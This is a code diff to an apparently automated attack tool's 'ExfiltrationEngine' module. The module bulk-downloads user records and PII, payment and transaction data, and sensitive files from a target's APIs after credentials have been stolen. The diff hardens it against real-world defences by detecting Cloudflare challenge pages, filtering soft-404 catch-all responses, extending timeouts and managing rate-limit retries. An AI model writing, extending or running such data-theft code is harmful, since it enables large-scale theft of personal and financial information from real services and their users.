@@ -5,9 +5,12 @@ Phase 5: Data theft at scale, bulk API downloads, database dumps
 
 import asyncio
 import aiohttp
+import json
 import logging
 from typing import Dict, List, Any, Optional
 from .base import ExfiltrationModule
+from .soft404 import is_soft404
+from .challenge import detect_challenge, note_challenge
 import time
 
 logger = logging.getLogger(__name__)
@@ -31,10 +34,14 @@ class ExfiltrationEngine(ExfiltrationModule):
         self.exfiltrated_records: int = 0
         self.data_size_mb: float = 0.0
         self.extraction_methods: List[str] = []
+        self._sig = None   # soft-404 baseline signature from recon
+        self._ctx = None   # AttackContext — set in execute(), used for WAF counters
 
     async def execute(self, context) -> Dict[str, Any]:
         """Execute data exfiltration attacks using lateral movement results"""
         logger.info(f"[Exfil] Starting exfiltration on {context.target_url}")
+        self._sig = getattr(context, "soft404_signature", None)
+        self._ctx = context
 
         # Only attempt if lateral movement was successful
         if not context.extracted_credentials:
@@ -66,6 +73,7 @@ class ExfiltrationEngine(ExfiltrationModule):
 
         url = f"{target}/api/v1/users"
         total_records = 0
+        rate_retries = 0
 
         try:
             async with aiohttp.ClientSession() as session:
@@ -78,11 +86,24 @@ class ExfiltrationEngine(ExfiltrationModule):
                     async with session.get(
                         url,
                         params={"page": page, "limit": page_size},
-                        timeout=aiohttp.ClientTimeout(total=5)
+                        timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status == 200:
-                            data = await resp.json()
-                            users = data.get("users", [])
+                            raw = await resp.text(errors="replace")
+                            if detect_challenge(resp.status, resp.headers, raw):
+                                logger.info("  ✗ Cloudflare challenge page — no real user API here")
+                                note_challenge(self)
+                                break
+                            if is_soft404(resp.status, raw,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                logger.info("  ✗ Catch-all response — no real user API here")
+                                break
+                            try:
+                                data = json.loads(raw)
+                            except Exception:
+                                logger.info("  ✗ Response is not JSON — no real user API here")
+                                break
+                            users = data.get("users", []) if isinstance(data, dict) else []
 
                             if not users:
                                 logger.info(f"  Reached end at page {page}")
@@ -104,7 +125,12 @@ class ExfiltrationEngine(ExfiltrationModule):
                                         logger.info(f"      ✓ Found PII: {field} = {str(user[field])[:30]}...")
 
                             page += 1
+                            rate_retries = 0
                         elif resp.status == 429:
+                            rate_retries += 1
+                            if rate_retries >= 3:
+                                logger.info(f"  Rate limited {rate_retries}× — target is throttling exports, moving on")
+                                break
                             logger.info(f"  Rate limited, backing off...")
                             await asyncio.sleep(5)
                         else:
@@ -141,10 +167,20 @@ class ExfiltrationEngine(ExfiltrationModule):
                     async with session.get(
                         url,
                         params={"limit": 1000},
-                        timeout=aiohttp.ClientTimeout(total=5)
+                        timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status == 200:
-                            data = await resp.json()
+                            raw = await resp.text(errors="replace")
+                            if detect_challenge(resp.status, resp.headers, raw):
+                                note_challenge(self)
+                                continue   # Cloudflare challenge page, not a real endpoint
+                            if is_soft404(resp.status, raw,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                continue   # catch-all page, not a real endpoint
+                            try:
+                                data = json.loads(raw)
+                            except Exception:
+                                continue   # HTML, not an API
                             records = len(data.get("transactions", data.get("payments", [])))
 
                             if records > 0:
@@ -185,9 +221,15 @@ class ExfiltrationEngine(ExfiltrationModule):
             for path in sensitive_paths:
                 try:
                     url = f"{target}{path}"
-                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
+                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                         if resp.status == 200:
-                            content = await resp.text()
+                            content = await resp.text(errors="replace")
+                            if detect_challenge(resp.status, resp.headers, content):
+                                note_challenge(self)
+                                continue   # Cloudflare challenge page — file does not exist
+                            if is_soft404(resp.status, content,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                continue   # catch-all page — file does not exist
                             size = len(content) / (1024 * 1024)
                             self.data_size_mb += size
                             files_found.append(path)
@@ -238,7 +280,7 @@ class ExfiltrationEngine(ExfiltrationModule):
                     async with session.get(
                         url,
                         headers=headers,
-                        timeout=aiohttp.ClientTimeout(total=2)
+                        timeout=aiohttp.ClientTimeout(total=6)
                     ) as resp:
                         if resp.status in [200, 302]:
                             content = await resp.text()
